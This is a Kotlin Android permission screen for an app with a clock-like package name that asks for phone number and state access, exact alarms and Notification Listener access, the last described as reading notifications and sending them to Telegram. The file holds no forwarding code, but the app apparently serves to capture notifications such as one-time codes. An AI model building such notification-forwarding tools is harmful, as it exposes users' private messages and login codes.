package com.android.declock

import android.Manifest
import android.app.AlarmManager
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class PermissionActivity : AppCompatActivity() {

    private data class Item(
        val key: String,
        val label: String,
        val description: String,
        val check: () -> Boolean,
        val request: () -> Unit,
    )

    private lateinit var container: LinearLayout
    private lateinit var continueBtn: Button
    private val items = mutableListOf<Item>()

    private val runtimeLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        val denied = result.filterValues { !it }.keys
        if (denied.isNotEmpty()) {
            val permanentlyDenied = denied.any { !ActivityCompat.shouldShowRequestPermissionRationale(this, it) }
            if (permanentlyDenied) {
                Toast.makeText(
                    this,
                    "Izin ditolak permanen. Aktifkan manual di Pengaturan aplikasi.",
                    Toast.LENGTH_LONG
                ).show()
                openAppSettings()
            } else {
                Toast.makeText(this, "Beberapa izin belum diberikan.", Toast.LENGTH_SHORT).show()
            }
        }
        refresh()
    }

    private val settingsLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { refresh() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.statusBarColor = Color.BLACK
        window.navigationBarColor = Color.BLACK
        buildItems()
        setContentView(buildUi())
        refresh()
    }

    override fun onResume() {
        super.onResume()
        refresh()
    }

    private fun buildItems() {
        items.clear()

        // Runtime permissions (dangerous) – batch request
        val runtimePerms = mutableListOf<String>()
        runtimePerms += Manifest.permission.READ_PHONE_STATE
        runtimePerms += Manifest.permission.READ_PHONE_NUMBERS
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            runtimePerms += Manifest.permission.POST_NOTIFICATIONS
        }

        items += Item(
            key = "phone",
            label = "Akses telepon (nomor & status)",
            description = "Diperlukan untuk membaca nomor & status telepon.",
            check = {
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
            },
            request = { requestRuntime(runtimePerms) },
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            items += Item(
                key = "notif",
                label = "Notifikasi",
                description = "Diperlukan agar aplikasi bisa menampilkan notifikasi.",
                check = {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
                },
                request = { requestRuntime(runtimePerms) },
            )
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            items += Item(
                key = "exact_alarm",
                label = "Alarm presisi (Exact alarm)",
                description = "Diperlukan agar alarm berbunyi tepat waktu.",
                check = {
                    val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
                    am.canScheduleExactAlarms()
                },
                request = {
                    try {
                        val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                            data = Uri.parse("package:$packageName")
                        }
                        settingsLauncher.launch(intent)
                    } catch (_: Exception) {
                        openAppSettings()
                    }
                },
            )
        }

        items += Item(
            key = "notif_listener",
            label = "Akses notifikasi (Notification Listener)",
            description = "Agar aplikasi dapat membaca notifikasi & mengirim ke Telegram.",
            check = { isNotificationListenerEnabled() },
            request = {
                try {
                    settingsLauncher.launch(Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (_: Exception) {
                    openAppSettings()
                }
            },
        )
    }

    private fun buildUi(): View {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            fitsSystemWindows = true
            setPadding(dp(20), dp(28), dp(20), dp(20))
        }

        val title = TextView(this).apply {
            text = "Izin yang diperlukan"
            setTextColor(Color.WHITE)
            textSize = 22f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        }
        val subtitle = TextView(this).apply {
            text = "Berikan semua izin di bawah agar aplikasi dapat berjalan dengan benar."
            setTextColor(0xFFAAAAAA.toInt())
            textSize = 13f
            setPadding(0, dp(6), 0, dp(18))
        }
        root.addView(title)
        root.addView(subtitle)

        val scroll = ScrollView(this)
        container = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        scroll.addView(container)
        root.addView(scroll, LinearLayout.LayoutParams(-1, 0, 1f))

        val actions = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.END
            setPadding(0, dp(12), 0, 0)
        }
        val grantAll = Button(this).apply {
            text = "Beri semua izin"
            setOnClickListener { requestAllMissing() }
        }
        continueBtn = Button(this).apply {
            text = "Lanjut"
            setOnClickListener { openMain() }
        }
        actions.addView(grantAll)
        actions.addView(Space(dp(8)))
        actions.addView(continueBtn)
        root.addView(actions)

        return root
    }

    @Suppress("FunctionName")
    private fun Space(w: Int): View = View(this).apply {
        layoutParams = LinearLayout.LayoutParams(w, 1)
    }

    private fun refresh() {
        container.removeAllViews()
        var allGranted = true
        for (item in items) {
            val granted = item.check()
            if (!granted) allGranted = false
            container.addView(rowView(item, granted))
        }
        continueBtn.isEnabled = allGranted
        continueBtn.alpha = if (allGranted) 1f else 0.5f
    }

    private fun rowView(item: Item, granted: Boolean): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(dp(14), dp(14), dp(14), dp(14))
            setBackgroundColor(0xFF111111.toInt())
        }
        val wrap = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        val name = TextView(this@PermissionActivity).apply {
            text = item.label
            setTextColor(Color.WHITE)
            textSize = 15f
        }
        val desc = TextView(this@PermissionActivity).apply {
            text = item.description
            setTextColor(0xFF888888.toInt())
            textSize = 12f
        }
        val status = TextView(this@PermissionActivity).apply {
            text = if (granted) "✓ Diberikan" else "✗ Belum diberikan"
            setTextColor(if (granted) 0xFF4CAF50.toInt() else 0xFFE57373.toInt())
            textSize = 12f
            setPadding(0, dp(4), 0, 0)
        }
        wrap.addView(name); wrap.addView(desc); wrap.addView(status)
        row.addView(wrap, LinearLayout.LayoutParams(0, -2, 1f))

        val btn = Button(this).apply {
            text = if (granted) "OK" else "Aktifkan"
            isEnabled = !granted
            setOnClickListener { item.request() }
        }
        row.addView(btn)

        val wrapper = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 0, 0, dp(10))
        }
        wrapper.addView(row)
        return wrapper
    }

    private fun requestAllMissing() {
        val runtimePerms = mutableListOf<String>()
        val phoneMissing =
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED
        if (phoneMissing) {
            runtimePerms += Manifest.permission.READ_PHONE_STATE
            runtimePerms += Manifest.permission.READ_PHONE_NUMBERS
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED
        ) {
            runtimePerms += Manifest.permission.POST_NOTIFICATIONS
        }
        if (runtimePerms.isNotEmpty()) {
            requestRuntime(runtimePerms)
            return
        }
        // No dangerous perms left – jump to first missing special setting
        items.firstOrNull { !it.check() }?.request?.invoke()
    }

    private fun requestRuntime(perms: List<String>) {
        val needed = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (needed.isEmpty()) { refresh(); return }
        // If any is permanently denied, jump straight to app settings so user can flip the toggle
        val permanentlyDenied = needed.any {
            !ActivityCompat.shouldShowRequestPermissionRationale(this, it) &&
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED &&
            hasAskedBefore(it)
        }
        if (permanentlyDenied) {
            Toast.makeText(this, "Izin sebelumnya ditolak. Aktifkan manual di Pengaturan.", Toast.LENGTH_LONG).show()
            openAppSettings()
            return
        }
        markAsked(needed)
        runtimeLauncher.launch(needed.toTypedArray())
    }

    private fun hasAskedBefore(perm: String): Boolean {
        val p = getSharedPreferences("perm_prefs", Context.MODE_PRIVATE)
        return p.getBoolean("asked_$perm", false)
    }

    private fun markAsked(perms: List<String>) {
        val p = getSharedPreferences("perm_prefs", Context.MODE_PRIVATE).edit()
        perms.forEach { p.putBoolean("asked_$it", true) }
        p.apply()
    }

    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        settingsLauncher.launch(intent)
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val component = ComponentName(this, NotificationService::class.java)
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val manager = getSystemService(android.app.NotificationManager::class.java)
                manager.isNotificationListenerAccessGranted(component)
            } else {
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
                    ?.split(":")
                    ?.any { it.equals(component.flattenToString(), ignoreCase = true) } == true
            }
        } catch (_: Exception) {
            false
        }
    }

    private fun openMain() {
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
}
